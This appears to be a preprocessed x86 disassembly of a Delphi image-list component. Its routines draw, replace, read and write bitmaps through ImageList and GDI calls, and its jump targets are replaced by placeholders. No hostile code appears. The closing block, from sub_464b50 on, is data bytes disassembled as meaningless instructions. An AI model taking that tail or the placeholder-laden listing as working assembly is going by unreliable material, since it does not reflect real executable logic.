push sub_4631e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42b1ac
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_42a3dc
call sub_425738
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_462d14
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_42a3dc
call sub_425738
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_462d14
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_462d14
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4631ee
mov eax [ ebp - 0x10 ]
call sub_4031ec
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
sub_463284
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_463303
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_463038
cmp esi eax
jl r-xdata
mov eax ebx
call sub_462b40
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
mov eax ebx
mov si 0xffef
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46330a
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
push esi
mov eax ebx
call sub_462d14
push eax
call ImageList_Remove
sub_46331c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_462b40
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_46293c
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_4033e8
pop esi
pop ebx
retn
sub_463354
push ebx
mov ebx eax
mov eax ebx
call sub_462b40
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_462d14
push eax
call ImageList_GetBkColor
call sub_46295c
pop ebx
retn
sub_46337c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_462b40
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_46293c
push eax
mov eax ebx
call sub_463354
call sub_46293c
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_425738
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_462d14
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_42a3dc
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424f74
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_41776c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_42a3dc
pop edx
call sub_425318
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_42a3dc
call sub_425738
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_462d14
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_41776c
mov eax [ ebx + 0x54 ]
call sub_42a3dc
call sub_425738
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_424f74
mov eax edi
call sub_425738
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_424f74
mov eax edi
call sub_425738
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_42b1ac
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_463550
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_463574
pop ebx
pop ebp
retn 0xc
sub_463574
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_462b40
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_4635c0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41776c
mov eax [ ebp - 0x4 ]
call sub_464254
xor eax eax
push ebp
push sub_463759
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46373c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_46371f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42b1ac
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463726
mov eax [ ebp - 0x10 ]
call sub_4031ec
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_42a3dc
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_425318
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_425738
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_42a3dc
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_425318
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_425738
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_462e50
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_463768
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_462d14
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_4635c0
sub_463788
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebx
call sub_462d78
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4193d8
mov eax ebx
call sub_463310
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_463970
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_462d14
mov edx eax
mov eax ebx
call sub_462c18
mov eax ebx
call sub_462b40
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_462d14
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_462b48
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_462d14
push eax
call ImageList_GetBkColor
call sub_46295c
mov edx eax
mov eax ebx
call sub_46331c
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_463768
jmp r-xdata
sub_463848
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4194bc
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_463970
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_463310
mov eax esi
call sub_462d14
mov edx eax
mov eax ebx
call sub_462c18
mov eax ebx
call sub_462b40
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_462d14
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_462b48
jmp r-xdata
mov eax esi
call sub_462d14
push eax
call ImageList_GetBkColor
call sub_46295c
mov edx eax
mov eax ebx
call sub_46331c
mov edx esi
mov eax ebx
call sub_463768
pop esi
pop ebx
retn
sub_4638f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_463964
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46396b
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_463998
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_418dc4
mov si 0xffff
call sub_4033e8
inc ebp
dec edi
jne r-xdata
sub_4639e8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418cb4
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418dc4
cmp ebp eax
jne r-xdata
sub_463a40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407f48
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_463a84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_463038
mov ebx eax
mov eax edi
call sub_463038
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_463038
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_463b60
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_463b43
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_463a40
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463b4a
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
mov eax edi
call sub_463038
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_463b74
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_463038
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_463a84
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_463bd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_421664
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_463b74
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_463c28
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41b5c8
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41b5c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_463eac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41b39c
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41b3bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_463e8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42b1ac
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41776c
mov eax [ ebp - 0x4 ]
call sub_464254
xor eax eax
push ebp
push sub_463e72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463e79
mov eax [ ebp - 0xc ]
call sub_4031ec
mov eax [ ebp - 0x14 ]
call sub_4031ec
mov eax [ ebp - 0x4 ]
call sub_464258
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_417794
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_42a3dc
push eax
mov eax [ ebp - 0xc ]
call sub_42a3dc
lea edx [ ebp - 0x30 ]
pop ecx
call sub_4251e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_417794
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_42a3dc
push eax
mov eax [ ebp - 0x14 ]
call sub_42a3dc
lea edx [ ebp - 0x30 ]
pop ecx
call sub_4251e4
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_462e50
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_463ebc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421de4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_463f1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_462cd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463f23
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
sub eax 0xffffffec
sub_463f23
mov eax [ ebp - 0x4 ]
call sub_462b40
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_464052
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41b3bc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41bb28
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41b3bc
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4031ec
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41b3bc
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421de4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_464035
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41b3bc
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_462cd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41b3bc
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_464084
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_462d78
mov eax edi
call sub_41b39c
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41b3bc
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_463c28
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_463ebc
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_464110
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_421de4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46420a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c3a4
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_462d14
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_462d14
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464211
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
jmp r-xdata
sub_464278
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
mov edx esi
call sub_4639e8
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4642c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4642e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4642f0
retn
sub_464b50
inc esi
add [ eax + 0x7800468f ] dl
xchg ebx eax
inc esi
add [ 0x6e654d54 ] al
jne r-xdata
add [ eax ] al
add [ edx + ecx * 2 + 0x1a5c0046 ] ch
inc edx
dec ebx
inc esi
add [ edi ] al
add [ esp + ebx * 4 ] ah
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax + 0x14004645 ] cl
pushfd
inc esi
add eax 0x6e654d54
jne r-xdata
pop es
dec edx
inc esi
add [ eax + 0x75 ] ch
inc ecx
add [ ebx ] al
add [ 0x756e654d ] al
jae r-xdata
push es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
insb
inc edi
inc esi
add [ eax + eax ] dh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
jae r-xdata
add [ edi + eax * 2 + 0x46 ] ch
jns r-xdata
add [ edi + ecx * 4 - 0x688fffba ] al
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
cmp al 0x0
add [ eax ] al
add eax [ eax ]
std
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
